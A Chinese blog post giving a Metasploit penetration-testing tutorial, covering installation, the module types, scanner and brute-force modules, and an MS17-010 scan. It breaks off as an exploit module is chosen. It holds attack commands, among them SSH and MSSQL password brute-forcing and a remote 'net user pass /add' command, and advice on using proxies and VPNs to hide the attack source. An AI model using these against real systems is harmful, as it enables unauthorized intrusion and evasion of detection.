

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/logo.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="永安寺">
  <meta name="keywords" content="">
  
  <title>MSF渗透常用操作指南 - Victory</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="MSF渗透常用操作指南">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      永安寺
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-05 12:59" pubdate>
        2022年2月5日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      11.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      143
       分钟
    </span>
  

  
  
    
      <!-- LeanCloud 统计文章PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">MSF渗透常用操作指南</h1>
            
            <div class="markdown-body">
              <h2 id="MSF渗透常用操作指南"><a href="#MSF渗透常用操作指南" class="headerlink" title="MSF渗透常用操作指南"></a>MSF渗透常用操作指南</h2><h3 id="一、msf安装与更新"><a href="#一、msf安装与更新" class="headerlink" title="一、msf安装与更新"></a>一、msf安装与更新</h3><p><strong>在服务器或者虚拟机执行</strong>(linux)</p>
<blockquote>
<p>curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rapid7/metasploitomnibus/master/config/templates/metasploit-frameworkwrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploitomnibus/master/config/templates/metasploit-frameworkwrappers/msfupdate.erb</a> &gt; msfinstall </p>
</blockquote>
<blockquote>
<p>chmod 755 msfinstall </p>
</blockquote>
<blockquote>
<p>./msfinstall</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202000955061.png" srcset="/img/loading.gif" lazyload alt="image-20220202000955061"></p>
<p><strong>然后验证是否安装成功</strong></p>
<p><strong>输入msfconsole</strong></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202001051064.png" srcset="/img/loading.gif" lazyload alt="image-20220202001051064"></p>
<p>Windows安装</p>
<p><a target="_blank" rel="noopener" href="https://windows.metasploit.com/metasploitframework-latest.msi">点击下载</a> <a target="_blank" rel="noopener" href="https://windows.metasploit.com/metasploitframework-latest.msi">https://windows.metasploit.com/metasploitframework-latest.msi</a></p>
<p><strong>安装</strong></p>
<p>解压安装包后直接点击安装</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202002027304.png" srcset="/img/loading.gif" lazyload alt="image-20220202002027304"></p>
<p>添加环境变量</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202002100966.png" srcset="/img/loading.gif" lazyload alt="image-20220202002100966"></p>
<p><strong>使用</strong></p>
<p>打开终端输入<code>msfconsole</code>直接使用</p>
<h3 id="二、更新msf"><a href="#二、更新msf" class="headerlink" title="二、更新msf"></a>二、更新msf</h3><blockquote>
<p>在目录内运行命令<code>./msfupdate</code></p>
</blockquote>
<blockquote>
<p>运行命令<code>apt update</code>,<code>apt install metasploit-framework</code></p>
</blockquote>
<p>如果./msfupdate不能执行 就把 /opt/metasploit-framework/bin/msfupdate 文件里面的 –allow-downgrades 参 数给去除掉，就可以更新了。</p>
<h3 id="三、msf七大模块介绍"><a href="#三、msf七大模块介绍" class="headerlink" title="三、msf七大模块介绍"></a>三、msf七大模块介绍</h3><p>msf有很多模块 一共有7个</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202003208833.png" srcset="/img/loading.gif" lazyload alt="image-20220202003208833"></p>
<blockquote>
<p>命令：ls /opt/metasploit-framework/embedded/framework/modules/ -al</p>
</blockquote>
<p>auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解、扫描、发掘漏洞、探测信息等工作。 </p>
<p>encoders 编码器模块，对payload进行编码加密，可绕过部分杀软软件，将攻击载荷进行编码（类似与加密），让避免操作系统和杀毒软件辨认出来但是会让载荷的体积变大，这个时候需要选择传输器和传输体配对成的攻击载荷来下载目标载荷并且运行。。</p>
<p>evasion 躲避模块，该模块分类下只有4个，都是为了躲避微软的限制或者是杀软 的，免杀效果很一般。</p>
<p>exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用，利用已发现的漏洞对远程目标系统进行攻击，植入并运行攻击载荷，从而控制目标系统。 </p>
<p>nops 空指令模块，为了避免攻击载荷在执行的过程中出现随机地址和返回地址错误而在执行shellcode之前加入一些空指令，使得在执行shellcode时有一个较大的安全着陆区。。</p>
<p>payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹 代码，可以是添加用户的代码，在渗透攻击触发漏洞后劫持程序执行流程并跳入的这段代码。本模块的作用是消除安全工作人员开发这部分代码的代价。 </p>
<p>post 后渗透模块，该模块一般用于内网渗透。</p>
<h3 id="四、msf之auxiliary常用模块演示"><a href="#四、msf之auxiliary常用模块演示" class="headerlink" title="四、msf之auxiliary常用模块演示"></a>四、msf之auxiliary常用模块演示</h3><p> 先查看auxiliary的功能模块</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202005949109.png" srcset="/img/loading.gif" lazyload alt="image-20220202005949109"></p>
<p>Metasploit的辅助模块主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等</p>
<p><em><strong>/<em>auxiliary模块命名规则/</em></strong></em></p>
<p>　命名规则：功能/服务/模块名称</p>
<p>例如：  scanner/discovery/arp_sweep</p>
<p><strong>一、辅助模块(auxiliary)分为三个大类</strong></p>
<p><em>1、Admin</em></p>
<ul>
<li><p>Admin/HTTP模块</p>
</li>
<li><p>Admin/MSSQL模块</p>
</li>
<li><p>Admin/MySQL模块</p>
</li>
<li><p>Admin/Postgres模块</p>
</li>
<li><p>Admin/VMWare模块</p>
</li>
</ul>
<p><em>2、Scanner</em></p>
<ul>
<li><p>DCERPC</p>
</li>
<li><p>Discovery</p>
</li>
<li><p>FTP</p>
</li>
<li><p>HTTP</p>
</li>
<li><p>IMAP</p>
</li>
<li><p>MSSQL</p>
</li>
<li><p>MySQL</p>
</li>
<li><p>NetBIOS</p>
</li>
<li><p>POP3</p>
</li>
<li><p>SMB</p>
</li>
<li><p>SMTP</p>
</li>
<li><p>SNMP</p>
</li>
<li><p>SSH</p>
</li>
<li><p>Telnet</p>
</li>
<li><p>TFTP</p>
</li>
<li><p>VMWare</p>
</li>
<li><p>VNC</p>
</li>
</ul>
<p><em>3、Server</em></p>
<ul>
<li>捕获模块</li>
</ul>
<p><strong>二、Admin例子</strong></p>
<p>1、查找关于mysql的辅助模块</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202125200330.png" srcset="/img/loading.gif" lazyload alt="image-20220202125200330"></p>
<p>2、选择auxiliary/admin/mysql/mysql_sql</p>
<p>use 1</p>
<p>3、查看需要设置的参数</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202125220394.png" srcset="/img/loading.gif" lazyload alt="image-20220202125220394"></p>
<p>4、设置目标主机、用户名和密码，</p>
<p>5、run，执行</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202125236483.png" srcset="/img/loading.gif" lazyload alt="image-20220202125236483"></p>
<p>其他的就不演示了 </p>
<p><strong>三、scanner例子</strong></p>
<p><em><strong>常用扫描模块及功能</strong></em></p>
<ul>
<li><p>auxiliary/scanner/portscan    端口扫描<br>auxiliary/scanner/smb/smb_version    SMB系统版本扫描<br>auxiliary/scanner/smb/smb_enumusers    SMB枚举<br>auxiliary/scanner/smb/smb_login    SMB弱口令扫描<br>auxiliary/admin/smb/psexec_command    SMB登录且执行命令<br>auxiliary/scanner/ssh/ssh_login    ssh登录测试<br>scanner/ mssq/mssql_ping    MSSQL主机信息扫描<br>admin/mssql/mssql_enum    MSSQL枚举<br>admin/mssql/mssql_exec    MSSQL执行命令<br>admin/mssql/mssql_sql    MSSQL查询<br>scanner/mssql/mssql_login    MSSQL弱口令扫描<br>auxiliary/admin/mysql/mysql_enum    MYSQL枚举<br>auxiliary/admin/mysql/mysql_sql    MYSQL语句执行<br>auxiliary/scanner/mysql/mysql_login    MYSQL弱口令扫描<br>auxiliary/scanner/smtp/smtp_version    SMTP版本扫描<br>auxiliary/scanner/smtp/smtp_enum    SMTP枚举<br>auxiliary/scanner/snmp/community    SNMP扫描设备<br>auxiliary/scanner/telnet/telnet_login    TELNET登录<br>scanner/vnc/vnc_none_auth    VNC空口令扫描</p>
</li>
<li><p>arp扫描<br>search arp<br>use auxiliary/scanner/discovery/arp_sweep<br>set interface rhost shost smac threads<br>run</p>
</li>
<li><p>端口扫描<br>search portscan<br>use auxiliary/scanner/portscan/syn<br>set interface posts rhosts threads<br>run</p>
</li>
<li><p>密码嗅探<br>use auxiliary/sniffer/psnuffle<br>支持从pcap抓包文件中提取密码<br>功能类似于dsniff<br>目前只支持pop3 imap ftp http_get协议</p>
</li>
<li><p>SNMP扫描<br>vi /etc/default/snmpd 侦听地址修改为0.0.0.0<br>use auxiliary/scanner/snmp_login<br>use auxiliary/scanner/snmp_enum<br>use auxiliary/scanner/snmp_enumusers （windows）<br>use auxiliary/scanner/snmp_enumshares （windows）</p>
</li>
<li><p>smb<br>smb版本扫描<br>use auxiliary/scanner/smb/smb_version<br>扫描命名管道，判断smb服务类型（账号、密码）<br>use auxiliary/scanner/smb/pipe_auditor<br>smb共享枚举（账号、密码）<br>use auxiliary/scanner/smb/smb_enumshares<br>smb用户枚举（账号、密码）<br>use auxiliary/scanner/smb/smb_enumusers<br>sid枚举（账号、密码）<br>use auxiliary/scanner/smb/smb_lookupsid</p>
</li>
<li><p>ssh<br>SSH版本扫描<br>use auxiliary/scanner/ssh/ssh_version<br>SSH密码爆破<br>use auxiliary/scanner/ssh/ssh_login<br>set userpass_file /usr/share/metasploit-framework/data/wordlist/root_userpass.txt<br>set verbose false<br>run<br>ssh -l root<br>ssh 192.168.0.11<br>ssh -l root 192.168.0.11<br>ssh <a href="mailto:&#114;&#x6f;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#46;&#x31;&#49;">&#114;&#x6f;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#46;&#x31;&#49;</a><br>ssh -p 12333 192.168.0.11<br>ssh -l root -p 12333 216.230.230.114<br>ssh -p 12333 <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x32;&#x31;&#x36;&#46;&#x32;&#x33;&#48;&#x2e;&#50;&#x33;&#48;&#46;&#x31;&#x31;&#x34;">&#x72;&#111;&#111;&#116;&#x40;&#x32;&#x31;&#x36;&#46;&#x32;&#x33;&#48;&#x2e;&#50;&#x33;&#48;&#46;&#x31;&#x31;&#x34;</a><br>SSH公钥登录<br>use auxiliary/scanner/ssh/ssh_login_pubkey<br>set key_file di_rsa<br>set username root<br>run</p>
</li>
<li><p>mssql<br>Mssql扫描端口<br>TCP 1433 （动态端口）/UDP 1434 （查询TCP端口号）<br>use auxiliary/scanner/mssql_ping<br>爆破mssql密码<br>use auxiliary/scanner/mssql_login<br>远程代码执行<br>use auxiliary/admin/mssql/mssql_exec<br>set cmd net user pass /add</p>
</li>
<li><p>ftp<br>ftp版本扫描<br>use auxiliary/scanner/ftp/ftp_version<br>use auxiliary/scanner/ftp/anonymous<br>use auxiliary/scanner/ftp/ftp_login</p>
</li>
<li><p>vnc<br>VNC：虚拟网络控制台，是一款优秀的远程控制工具软，基于 UNIX 和 Linux 操作系统的免费的开源软件，远程控制能力强大，高效实用，其性能可以和 Windows 和 MAC 中的任何远程控制软件媲美<br>vnc密码破解<br>use auxiliary/scanner/vnc/vnc_login<br>vnc无密码访问<br>use auxiliary/scanner/vnc/vnc_none_auth</p>
</li>
<li><p>rdp<br>RDP远程桌面漏洞<br>use auxiliary/scanner/rdp/ms12_020_check<br>-检查不会造成dos攻击</p>
</li>
<li><p>设备后门<br>use auxiliary/scanner/ssh/juniper_backdoor<br>use auxiliary/scanner/ssh/fortine_backdoor</p>
</li>
<li><p>HTTP弱点扫描<br>过期证书<br>use auxiliary/scanner/http/cert<br>显示目录及文件<br>use auxiliary/scanner/http/dir_listing<br>use auxiliary/scanner/http/files_dir<br>WEBDAV Unicode编码身份验证绕过<br>IIS的WebDAV功能在解析URI并发送回数据时没有正确地处理Unicode令牌环，远程攻击者可以通过提交恶意HTTPGET请求绕过受口令保护的文件夹的认证，或在受口令保护的WebDAV目录中列出、上传或下载文件<br>use auxiliary/scanner/http/dir_webdav_unicode_bypass</p>
</li>
<li><p>tomcat管理登录页面<br>use auxiliary/scanner/http/tomcat_mgr_login</p>
</li>
<li><p>基于http方法的身份验证绕过<br>use auxiliary/scanner/http/tomcat_auth_bypass</p>
</li>
<li><p>wordpress密码爆破<br>use auxiliary/scanner/http/wordpress_login_enum<br>set uri /wordpress/wp-login.php</p>
</li>
<li><p>wmap web应用扫描器<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kyx599/p/12936169.html">https://www.cnblogs.com/kyx599/p/12936169.html</a></p>
</li>
<li><p>telnet爆破<br>use auxiliary/scanner/telnet/telnet_login</p>
</li>
</ul>
<h4 id="端⼝扫描"><a href="#端⼝扫描" class="headerlink" title="端⼝扫描"></a><em>端⼝扫描</em></h4><ul>
<li>ACK 通过ACK扫描的方式对防火墙上未屏蔽的端口进行探测 </li>
<li>ACK防⽕墙扫描 auxiliary/scanner/portscan/ack </li>
<li>ftpbounce 通过FTPbounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器 软件能够很好的防范FTPbounce攻击，但在一些旧的Solaris及FreeBSD系统的FTP服务中 此类工具方法仍能够被利用 </li>
<li>FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce </li>
<li>syn 使用发送TCP SYN标志的方式探测开放的端口 </li>
<li>SYN端⼝扫描 auxiliary/scanner/portscan/syn </li>
<li>tcp 通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确， 但扫描速度较慢 </li>
<li>TCP端⼝扫描 auxiliary/scanner/portscan/tcp </li>
<li>xmas 一种更为隐秘的扫描方式，通过发送FIN,PSH,和URG标志，能够躲避 一些高级的TCP标记检测器的过滤</li>
<li>TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas</li>
</ul>
<p><em><strong>TCP端⼝扫描：auxiliary/scanner/portscan/tcp</strong></em></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202150939018.png" srcset="/img/loading.gif" lazyload alt="image-20220202150939018"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202152627022.png" srcset="/img/loading.gif" lazyload alt="image-20220202152627022"></p>
<p>扫描结束 192.168.1.14的开放端口</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202152736157.png" srcset="/img/loading.gif" lazyload alt="image-20220202152736157"></p>
<p><em><strong>ACK防⽕墙扫描：auxiliary/scanner/portscan/ack</strong></em></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153306378.png" srcset="/img/loading.gif" lazyload alt="image-20220202153306378"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153327426.png" srcset="/img/loading.gif" lazyload alt="image-20220202153327426"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153603820.png" srcset="/img/loading.gif" lazyload alt="image-20220202153603820"></p>
<p>⽤ACK扫描会分段去发送数据包扫描，才能够绕过⼀些防火墙设备，⽽不是 Windows防火墙！Windows⾃带的防火墙是阻断⼀切进入的连接! 因为虚拟机Windwos 7是吧防火墙关闭了的，如果打开那么防火墙是会阻断 连接的！ 经过测试，Windows防火墙开启，使⽤ACK是扫描不出来的！</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153629956.png" srcset="/img/loading.gif" lazyload alt="image-20220202153629956"></p>
<p><em><strong>FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce</strong></em> </p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202154130153.png" srcset="/img/loading.gif" lazyload alt="image-20220202154130153"></p>
<p>这个因为环境情况 就没有演示</p>
<p>详细可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/asdushf/article/details/111691756">https://blog.csdn.net/asdushf/article/details/111691756</a></p>
<p><em><strong>SYN端⼝扫描 auxiliary/scanner/portscan/syn</strong></em></p>
<p>TCP 端口扫描是通过SYN数据包进行的，用于扫描目标机器的端口上是否存在程序监听，通常意义上，普通个人机器上的某个端口如果有程序监听的话，那么它一般是 系统漏洞。由于TCP是一个有连接的可靠协议，所以要使用 三次握手来建立连接， 三次握手的 报文分别是(SYN)、(ACK SYN)和(ACK)。进行 端口扫描时，首先向对方主机的某一端口发送(SYN) 报文，如果对方这一端口上有程序在监听（或者说存在漏洞），则回复(SYN ACK) 报文，否则回复(RST)报文。据此就可以判断对方端口上是否有程序在监听了，或者是否存在漏洞了。<br>参考：<a target="_blank" rel="noopener" href="https://blog.51cto.com/ksyiwen/1336392">https://blog.51cto.com/ksyiwen/1336392</a></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202155034118.png" srcset="/img/loading.gif" lazyload alt="image-20220202155034118"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202155048056.png" srcset="/img/loading.gif" lazyload alt="image-20220202155048056"></p>
<p><em><strong>TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas</strong></em></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202155853690.png" srcset="/img/loading.gif" lazyload alt="image-20220202155853690"></p>
<h4 id="常见的网络服务扫描"><a href="#常见的网络服务扫描" class="headerlink" title="常见的网络服务扫描"></a>常见的网络服务扫描</h4><h5 id="1-Telnet服务扫描"><a href="#1-Telnet服务扫描" class="headerlink" title="1.Telnet服务扫描"></a>1.Telnet服务扫描</h5><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001914027.png" srcset="/img/loading.gif" lazyload alt="image-20220203001914027"></p>
<p>代码清单3-19中的扫描结果显示，IP地址为10.10.10.254的主机（即网关服务器）开放了Telnet服务，通过返回的服务旗标“Ubuntu 8.041x0ametasploitable login : ”，可以进一步确认出这台主机的操作系统版本为Ubuntu 8.04，而主机名为metasploitable。</p>
<h5 id="2-SSH服务扫描"><a href="#2-SSH服务扫描" class="headerlink" title="2.SSH服务扫描"></a>2.SSH服务扫描</h5><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203002054031.png" srcset="/img/loading.gif" lazyload alt="image-20220203002054031"></p>
<p>如代码清单3-20所示，使用Metasploit中的ssh_version辅助模块，很快在网络中定位了两台开放SSH服务的主机，分别是10.10.10.129(网站服务器）和10.10.10.254（网关服务器)，并且显示了SSH服务软件及具体版本号。</p>
<h4 id="3-Oracle数据库服务查点"><a href="#3-Oracle数据库服务查点" class="headerlink" title="3.Oracle数据库服务查点"></a>3.Oracle数据库服务查点</h4><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203002153611.png" srcset="/img/loading.gif" lazyload alt="image-20220203002153611"></p>
<h4 id="4-开放代理探测与利用"><a href="#4-开放代理探测与利用" class="headerlink" title="4.开放代理探测与利用"></a>4.开放代理探测与利用</h4><p>在一些特殊情形的渗透测试工作中，为避免被对方的入侵检测系统跟踪，你很有可能需要隐藏自己的身份。隐藏网络身份的技术很多，比如使用代理服务器(Proxy)、VPN等，不过最简单和最常见的还是使用代理服务器。<br>Metasploit提供了open_proxy模块，能够让你更加方便地获取免费的HTTP代理服务器地址。获取免费开放代理之后，就可以在浏览器或者一些支持配置代理的渗透软件中配置代理，这可以在进行渗透测试时隐藏你的真实I地址。其使用方法如代码清单3-22所示。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203002320432.png" srcset="/img/loading.gif" lazyload alt="image-20220203002320432"></p>
<p>当然，也可以从互联网上搜索一些开放的HTTP、Socks等代理服务器，然后通过代理猎手等专用工具进行验证，并在进行隐蔽性渗透测试的场景中进行使用。比开放代理更保险的隐藏攻击源方法是利用开放的或者自主架设的VPN服务，可以从公开渠道搜集到一些免费的VPN服务，也可以自己在已控制的主机上架设OpenVPN服务。使用这些VPN可以采用加密方式转发路由你的渗透测试数据包，而无需担心你的攻击发起源被跟踪到。</p>
<h4 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h4><p>探测对方操作系统信息：use auxiliary/scanner/smb/smb_version</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203000138282.png" srcset="/img/loading.gif" lazyload alt="image-20220203000138282"></p>
<p>可以看到，操作系统是Windows 7,主机名是:FUZHONG,在GOD域内</p>
<p>扫描永恒之蓝ms17010 ：use auxiliary/scanner/smb/smb_ms17_010</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203000621982.png" srcset="/img/loading.gif" lazyload alt="image-20220203000621982"></p>
<p>Host is likely VULNERABLE to MS17-010! 说明是存在永恒之蓝</p>
<p>利用：</p>
<p>可以先用search 搜索一下17010的漏洞利用模块</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203000827312.png" srcset="/img/loading.gif" lazyload alt="image-20220203000827312"></p>
<p>这里就随便选一个来利用了</p>
